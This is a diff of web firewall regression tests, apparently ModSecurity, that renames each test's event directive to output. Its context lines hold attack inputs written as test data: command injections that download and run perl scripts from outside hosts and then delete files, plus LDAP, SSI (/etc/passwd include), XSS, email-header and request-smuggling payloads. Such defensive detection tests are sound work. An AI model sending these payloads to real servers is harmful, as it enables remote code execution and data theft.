@@ -2,7 +2,7 @@
 
 %test System Command Injection (950907)
 ###################################
-%event 950907
+%output 950907
 %var command=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf *.txt');
 %var command=http://ricky.ilmerlodellarocca.com/upload.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;%20appa.jpg;perl%20appa.jpg;rm%20-rf%20appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;mv%20ca.php%20ca.php;chmod%20755%20ca.php
 %request
@@ -17,7 +17,7 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 
 %test Injection of Undocumented ColdFusion Tags (950008)
 ###################################
-%event 950008
+%output 950008
 %var cf_command=cfusion_decrypt(string%2ckey)
 %var cf_command=%3CCFINTERNALDEBUG%20ACTION%3D%22pcode%22%20OUTVAR%3D%22r_var%22%20TEMPLATEPATH%3D%22%23template%23%22%3E
 %request
@@ -33,7 +33,7 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 
 %test LDAP Injection Attack (950010)
 ###################################
-%event 950010
+%output 950010
 %var ldap_command=jsmith)(|(objectclass=*)
 %var ldap_command=joe)(|(password=*
 %var ldap_command=(&(objectClass=*)(objectClass=resources)) 
@@ -49,7 +49,7 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 
 %test SSI Injection Attack (950011)
 ###################################
-%event 950011
+%output 950011
 %var ssi_command=%3C!--%23exec%20cmd%3D%22ls%22%20--%3E
 %var ssi_command=%3C!--%23include%20virtual%3D%22%2Fetc%2Fpasswd%22%20--%3E
 %request
@@ -64,7 +64,7 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 
 %test Universal PDF XSS URL Detected (950018)
 ###################################
-%event 950018
+%output 950018
 %var updf=http%3A%2F%2Fwww.example.com%2Ffile.pdf%23a%3Djavascript%3Aalert('Alert')
 %request
 GET /?foo=$updf HTTP/1.0
@@ -78,7 +78,7 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 
 %test Email Injection Attack (950019) 
 #####################################################
-%event 950019
+%output 950019
 %request
 POST / HTTP/1.0
 Host: local
@@ -95,7 +95,7 @@ body=email@anonymous.xxx%0ATo:email1@who.xxx
 
 %test HTTP Request Smuggling Attack (950012) 
 ###################################
-%event 950012
+%output 950012
 %request
 GET / HTTP/1.0
 Host: local
@@ -110,7 +110,7 @@ Transfer-Encoding: utf-8
 
 %test HTTP Request Smuggling (950012)
 ###################################
-%event 950012
+%output 950012
 %request
 POST / HTTP/1.0
 Host: local
